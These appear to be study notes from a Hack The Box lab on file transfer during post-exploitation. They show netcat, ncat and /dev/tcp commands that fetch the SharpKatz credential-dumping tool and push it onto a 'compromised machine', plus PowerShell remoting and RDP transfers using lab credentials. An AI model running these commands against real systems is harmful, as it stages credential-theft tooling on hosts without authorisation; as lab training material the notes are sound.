## Netcat

#### NetCat - Compromised Machine - Listening on Port 8000

```Shell
victim@target:~$ # Example using Original Netcat 
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```
#### Ncat - Compromised Machine - Listening on Port 8000

```Shell
victim@target:~$ # Example using Ncat 
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
#### Netcat - Attack Host - Sending File to Compromised machine

```Shell
3kjS@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe 3kjS@htb[/htb]$ # Example using Original Netcat 
3kjS@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
#### Ncat - Attack Host - Sending File to Compromised machine

```Shell
3kjS@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe 3kjS@htb[/htb]$ # Example using Ncat 
3kjS@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
#### Attack Host - Sending File as Input to Netcat

```Shell
3kjS@htb[/htb]$ # Example using Original Netcat 
3kjS@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
#### Compromised Machine Connect to Netcat to Receive the File

```Shell
victim@target:~$ # Example using Original Netcat 
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```
#### Attack Host - Sending File as Input to Ncat

```Shell
3kjS@htb[/htb]$ # Example using Ncat 
3kjS@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Compromised Machine Connect to Ncat to Receive the File

```Shell
victim@target:~$ # Example using Ncat 
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
#### NetCat - Sending File as Input to Netcat

```Shell
3kjS@htb[/htb]$ # Example using Original Netcat 
3kjS@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
#### Ncat - Sending File as Input to Ncat

```Shell
3kjS@htb[/htb]$ # Example using Ncat 
3kjS@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```Shell
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## PowerShell Session File Transfer

#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

```Powershell
PS C:\htb> whoami 

htb\administrator 

PS C:\htb> hostname 

DC01
```

```Powershell
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985 

ComputerName : DATABASE01 
RemoteAddress : 192.168.1.101 
RemotePort : 5985 
InterfaceAlias : Ethernet0 
SourceAddress : 192.168.1.100 
TcpTestSucceeded : True
```
#### Create a PowerShell Remoting Session to DATABASE01

```Powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```
#### Copy samplefile.txt from our Localhost to the DATABASE01 Session

```Powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
#### Copy DATABASE.txt from DATABASE01 Session to our Localhost

```Powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP

#### Mounting a Linux Folder Using rdesktop

```Shell
3kjS@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
#### Mounting a Linux Folder Using xfreerdp

```Shell
3kjS@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
![[Pasted image 20260501114644.png]]

Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.
![[Pasted image 20260501114655.png]]

